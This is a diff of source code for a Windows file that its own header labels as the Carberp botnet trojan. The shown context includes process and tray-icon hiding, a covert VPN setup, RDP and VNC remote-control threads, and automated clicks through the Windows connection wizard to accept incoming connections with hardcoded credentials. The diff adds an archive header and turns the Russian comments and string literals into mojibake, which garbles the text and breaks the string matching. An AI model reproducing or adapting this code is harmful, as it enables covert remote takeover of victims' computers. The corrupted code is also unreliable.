@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 #include "ClientOps.h"
 #include "../common/protocol.h"
@@ -191,7 +202,7 @@ void EnumChilds(HWND hWnd,WND_INFO *lpWndInfo)
     return;
 }
 
-// TODO (Гость#1#): перехват в скрытом браузере, посыл сообщений как в внц
+// TODO (пїЅпїЅпїЅпїЅпїЅ#1#): пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ
 
 void EnumWnds(HWND hWnd)
 {
@@ -461,7 +472,7 @@ DWORD WINAPI HideProcessThread( LPVOID lpThreadParameter )
 	}
 	return 0;
 }
-bool HideSystemTrayIcon()/// делаем кно
+bool HideSystemTrayIcon()/// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 {
 	for( int i=18; i<=24; i++ )
 	{
@@ -480,7 +491,7 @@ bool HideSystemTrayIcon()/// делаем кно
 	return 0;
 }
 
-bool ShowSystemTrayIcon()/// делаем кно
+bool ShowSystemTrayIcon()/// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 {
 	for( int i=18; i<=24; i++ )
 	{
@@ -748,8 +759,8 @@ bool GetGatewayA(CHAR* pszGateway)
 	CHAR* pszComandResult = RunCommandA("route print 0.0.0.0");
 	for(CHAR* pszStringIter = pszComandResult; pszStringIter[0]!=NULL; pszStringIter+=strlen(pszStringIter))*/
 	{
-		CHAR* pszSpan = strstr((CHAR*)pszComandResult, "Основной шлюз");
-		//CHAR* pszSpan = strstr(pszStringIter, "Основной шлюз");
+		CHAR* pszSpan = strstr((CHAR*)pszComandResult, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ");
+		//CHAR* pszSpan = strstr(pszStringIter, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ");
 		if(pszSpan == NULL) return false;
 		//if(pszSpan == NULL) continue;
 
@@ -771,7 +782,7 @@ bool GetGatewayW(WCHAR* pszGateway)
 	WCHAR* pszComandResult = RunCommandW(L"route print 0.0.0.0");
 	for(WCHAR* pszStringIter = pszComandResult; pszStringIter!=NULL; pszStringIter+=wcslen(pszStringIter))
 	{
-		WCHAR* pszSpan = wcsstr((WCHAR*)pszStringIter, L"Основной шлюз");
+		WCHAR* pszSpan = wcsstr((WCHAR*)pszStringIter, L"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ");
 		if(pszSpan == NULL) continue;
 
 		pszSpan = wcstok(pszSpan, L":");
@@ -873,14 +884,14 @@ DWORD VPNStart(LPVOID send_params)
 	SOCKET s = ((SendParams*)send_params)->socket;
 	DWORD err = 0;
 
-	//Подготовка структуры к получению данных об удалённом соединении.
-	//Необходимо заполнить dwSize и szEntryName
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ dwSize пїЅ szEntryName
 	LPRASDIALPARAMS params = new RASDIALPARAMS();
 	memset(params, 0, sizeof(RASDIALPARAMS));
 	params->dwSize = sizeof(RASDIALPARAMS);
 	wcscpy(&params->szEntryName[0], L"XXX");
 
-	//Получение данных об удалённом подключении
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	BOOL bPass = FALSE;
 	err = RasGetEntryDialParams(NULL, params, &bPass);
 	if(err != ERROR_SUCCESS)
@@ -888,7 +899,7 @@ DWORD VPNStart(LPVOID send_params)
 		goto ret;
 	}
 
-	//Дозвон
+	//пїЅпїЅпїЅпїЅпїЅпїЅ
 	HRASCONN hRasConn = NULL;
 	wcscpy(&params->szUserName[0], L"pptp");
 	wcscpy(&params->szPassword[0], L"pptp");
@@ -963,11 +974,11 @@ DWORD CheckVPNState(DWORD* result)
 	DWORD dwBufferSize = sizeof(RASCONNW);
 	DWORD dwCount = 0;
 
-	// Получаем необходимый размер буффера для списка соедидений
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	LPRASCONNW pRasConn = (LPRASCONNW)malloc(sizeof(RASCONNW));
 	if(pRasConn == NULL) return GetLastError();
 	memset(pRasConn, 0, sizeof(RASCONNW));
-	pRasConn->dwSize = 52;	// минимальная версия - подходит везде и содержит нужные данные
+	pRasConn->dwSize = 52;	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	err = RasEnumConnectionsW(pRasConn, &dwBufferSize, &dwCount);
 	if(err == ERROR_SUCCESS && dwCount == 0)
 	{
@@ -984,7 +995,7 @@ DWORD CheckVPNState(DWORD* result)
 	else if(err == ERROR_BUFFER_TOO_SMALL)
 	{
 		pRasConn = (LPRASCONNW)realloc(pRasConn, dwBufferSize);
-		// Получаем все соединения
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		err = RasEnumConnectionsW(pRasConn, &dwBufferSize, &dwCount);
 		if(err != ERROR_SUCCESS)
 		{
@@ -994,7 +1005,7 @@ DWORD CheckVPNState(DWORD* result)
 	}
 
 
-	// Поиск соединения ХХХ
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	LPRASCONNW XXX = NULL;
 	for(int i=0; i<dwCount; i++)
 	{
@@ -1005,14 +1016,14 @@ DWORD CheckVPNState(DWORD* result)
 		}
 	}
 
-	// Нужное соединение не найдено
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if(XXX == NULL)
 	{
 		free(pRasConn);
 		return -1;
 	}
 
-	// Получаем статус интересующего соединения
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	LPRASCONNSTATUSW lpRasConnStatus = new RASCONNSTATUSW();
 	memset(lpRasConnStatus, 0, sizeof(RASCONNSTATUSW));
 	lpRasConnStatus->dwSize = sizeof(RASCONNSTATUSW);
@@ -1038,10 +1049,10 @@ DWORD VPNStop()
 	DWORD dwBufferSize = 0;
 	DWORD dwCount = 0;
 
-	// Получаем необходимый размер буффера для списка соедидений
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	LPRASCONNW pRasConn = (LPRASCONNW)malloc(sizeof(RASCONNW));
 	memset(pRasConn, 0, sizeof(RASCONNW));
-	pRasConn->dwSize = 52;	// минимальная версия - подходит везде и содержит нужные данные
+	pRasConn->dwSize = 52;	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	err = RasEnumConnectionsW(pRasConn, &dwBufferSize, &dwCount);
 	if(err == ERROR_SUCCESS && dwCount == 0)
 	{
@@ -1057,7 +1068,7 @@ DWORD VPNStop()
 	else if(err == ERROR_BUFFER_TOO_SMALL)
 	{
 		pRasConn = (LPRASCONNW)realloc(pRasConn, dwBufferSize);
-		// Получаем все соединения
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		err = RasEnumConnectionsW(pRasConn, &dwBufferSize, &dwCount);
 		if(err != ERROR_SUCCESS)
 		{
@@ -1066,7 +1077,7 @@ DWORD VPNStop()
 		}
 	}
 
-	// Поиск соединения ХХХ
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	LPRASCONNW XXX = NULL;
 	for(int i=0; i<dwCount; i++)
 	{
@@ -1077,7 +1088,7 @@ DWORD VPNStop()
 		}
 	}
 
-	// Нужное соединение не найдено
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if(XXX == NULL)
 	{
 		free(pRasConn);
@@ -1192,7 +1203,7 @@ DWORD WINAPI ClientStartRDP_Dll1( LPVOID lpThreadParameter )
 
 	int i=Init(ip);
 	int w=Start();
-	while ( 1 )// ждем команды на выключение
+	while ( 1 )// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		HANDLE tmp;
 		tmp= (HANDLE)OpenMutexA(MUTEX_ALL_ACCESS,false, "DllStop");
@@ -1235,7 +1246,7 @@ DWORD StartVNC(LPBYTE param)
 
 
 	Start();
-	while ( 1 )// ждем команды на выключение
+	while ( 1 )// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		HANDLE tmp;
 		tmp= (HANDLE)OpenMutexA(MUTEX_ALL_ACCESS,false, "ANCStop");
@@ -1312,7 +1323,7 @@ DWORD CreateVPNDialog(LPVOID send_params)
 	if( CreateProcessA( NULL, "control.exe NETCONNECTIONS", 0, 0, 1, 0, 0, 0, &si, &pi ) )//cmd /C C:\\vpn_xxx.vbs
 	{
 		Sleep(5000);
-		while (!(hWnd_newConnection=FindWindow(NULL,L"Мастер новых подключений")))
+		while (!(hWnd_newConnection=FindWindow(NULL,L"пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ")))
 		{
 			Sleep(50);
 		}
@@ -1320,28 +1331,28 @@ DWORD CreateVPNDialog(LPVOID send_params)
 
 		if(hWnd_newConnection != NULL)
 		{
-		//	ClickedControl(hWnd_newConnection,71,163,false,0,0,false);//далее
+		//	ClickedControl(hWnd_newConnection,71,163,false,0,0,false);//пїЅпїЅпїЅпїЅпїЅ
 			Sleep(1000);
-			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//далее
+			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//пїЅпїЅпїЅпїЅпїЅ
 			Sleep(1000);
-			ClickedControl(hWnd_newConnection,154,161,false,0,0,false);//прямое подключение
+			ClickedControl(hWnd_newConnection,154,161,false,0,0,false);//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			Sleep(1000);
-			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//далее
+			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//пїЅпїЅпїЅпїЅпїЅ
 			Sleep(1000);
-			ClickedControl(hWnd_newConnection,146,213,false,0,0,false);//принимать входящие
+			ClickedControl(hWnd_newConnection,146,213,false,0,0,false);//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			Sleep(1000);
-			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//далее
+			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//пїЅпїЅпїЅпїЅпїЅ
 			Sleep(1000);
 			WindowKeys((DWORD_PTR)hWnd_newConnection,62,150,L"XXX",false,false,false);
 			Sleep(1000);
-			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//далее
+			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//пїЅпїЅпїЅпїЅпїЅ
 			//WindowKeys((DWORD_PTR)hWnd_newConnection,62,150,L"",true,false,false);
 			Sleep(1000);
 			WindowKeys((DWORD_PTR)hWnd_newConnection,62,150,ip,false,false,false);
 			Sleep(1000);
-			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//далее
+			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//пїЅпїЅпїЅпїЅпїЅ
 			Sleep(1000);
-			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//далее
+			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//пїЅпїЅпїЅпїЅпїЅ
 			return true;
 		}
 	}
